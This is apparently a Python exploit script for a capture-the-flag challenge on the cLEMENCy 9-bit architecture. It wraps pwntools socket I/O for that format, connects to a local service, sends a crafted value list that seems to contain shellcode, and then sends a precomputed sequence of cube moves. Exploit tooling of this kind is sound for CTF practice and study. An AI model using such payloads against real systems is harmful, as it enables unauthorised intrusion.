  #!/usr/bin/python

from cLEMENCy import *
from pwn import *
from math import *

context.log_level = 'error'

class cremote(remote):
    def recv_raw(self, numb):
        numb = int(ceil(numb*9/8.0))
        if self.closed["recv"]:
            raise EOFError

        while True:
            try:
                data = self.sock.recv(numb)
                break
            except socket.timeout:
                return None
            except IOError as e:
                if e.errno == errno.EAGAIN:
                    return None
                elif e.errno in [errno.ECONNREFUSED, errno.ECONNRESET]:
                    self.shutdown("recv")
                    raise EOFError
                elif e.errno == errno.EINTR:
                    continue
                else:
                    raise

        if data == '':
            self.shutdown("recv")
            raise EOFError

        data = b2c(data)

        return data

    def recvline (self):
        if self.closed["recv"]:
            raise EOFError
        data = ""
        while True:
            try:
                data += self.sock.recv(1)
                if '\n' in c2s(b2c(data)):
                  break
            except socket.timeout:
                return None
            except IOError as e:
                if e.errno == errno.EAGAIN:
                    return None
                elif e.errno in [errno.ECONNREFUSED, errno.ECONNRESET]:
                    self.shutdown("recv")
                    raise EOFError
                elif e.errno == errno.EINTR:
                    continue
                else:
                    raise

        if data == '':
            self.shutdown("recv")
            raise EOFError

        data = b2c(data)

        return data


    def send_raw(self, data):
        if self.closed["send"]:
            raise EOFError

        try:
            if isinstance(data, cBytes):
                data = c2b(data)
            elif type(data) == str:
                data = c2b(s2c(data))

            self.sock.sendall(data)
        except IOError as e:
            eof_numbers = [errno.EPIPE, errno.ECONNRESET, errno.ECONNREFUSED]
            if e.message == 'Socket is closed' or e.errno in eof_numbers:
                self.shutdown("send")
                raise EOFError
            else:
                raise
#p = process('./clemency-emu -l 0 hello_patch.bin', shell=True)
r = cremote('0', 12344)
print("connecting success!\n")
print c2s(r.recvline ())
print c2s(r.recv_raw(1024))


rnd = [41955385, 17112190, 117983711, 118726700, 22418165, 9672330, 94662907, 91141912, 127174001, 117851478, 48106967, 80474308, 65455021, 37074146, 1621107, 84195632, 93309353, 127349038, 125163727, 96287836, 2511717, 55100986, 66092779, 38823496, 118545633, 64831494, 121211591, 8119028, 79798813, 115878546]
shuf = []

res = "U',U,D',D,L',L,R',R,F',F,B',B".split(",")

for i in rnd:
    shuf.append(res[i%12])
print("shuf : ")
print(shuf)
shuf.reverse()

sc = map(lambda x: int(x, 16), "000 120 000 080 110 040 000 1cc 048 17a".split(" "))
print("sc :")
print(sc)
sc += (54-len(sc))*[0,]
print("sc+")
print(sc)

# print shuf
payload = ','.join(map(str, sc)) + '\n'
print(payload)
r.send_raw (payload)

cnt = 0
for i in shuf:
    cnt += 1
    # print 'sending ',i
    for j in range(15):
        print c2s(r.recvline ())[:-1]
    print c2s(r.recv_raw(1024))

    r.send_raw(i+'\n')


for j in range(16):
    print c2s(r.recvline ())[:-1]

print c2s(r.recvline ())[:-1]
